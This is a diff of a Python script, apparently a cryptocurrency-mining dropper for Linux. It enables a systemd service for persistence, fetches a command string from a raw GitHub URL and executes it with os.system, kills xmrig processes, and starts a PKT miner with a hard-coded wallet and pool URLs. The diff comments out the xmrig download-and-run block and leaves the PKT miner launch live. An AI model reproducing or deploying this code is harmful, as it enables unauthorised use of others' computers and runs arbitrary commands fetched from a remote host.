@@ -78,8 +78,9 @@ if operate_system == 'lin':
             os.system('systemctl enable dao')
     except:
         pass
-
     #print('So cores de dao la %s' %cores)
+    #xmr
+    '''
     link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
     link_download_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
     link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/command_xmrig'
@@ -124,7 +125,8 @@ if operate_system == 'lin':
             os.system('tar xf %s' %gz_name)
     except:
         pass
-    '''
+   
+
     try:
         response = requests.get(link_command_xmrig, timeout=timeout)
         command_xmrig_download = response.text.strip()
@@ -135,7 +137,7 @@ if operate_system == 'lin':
             os.system('pkill xmrig')
     except:
         pass
-    '''
+   
     try:
         xmrig_dachay = False
         for proc in psutil.process_iter():
@@ -158,7 +160,7 @@ if operate_system == 'lin':
             os.system ('nohup %s &' %command)
         else:
             os.system ('%s &' %command)
-
+    '''
 
     #pkt
     
@@ -210,7 +212,8 @@ if operate_system == 'lin':
     except:
         pass
     if pkt_dachay == False:
-        command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkteer.com http://pool.pkthash.com -t 1' % pkt_name
+        #command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkteer.com http://pool.pkthash.com -t 1' % pkt_name
+        command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkteer.com http://pool.pkthash.com' % pkt_name
         print(command)
         if os.path.isfile('/usr/bin/screen'):
             print('Co chuong trinh screen')
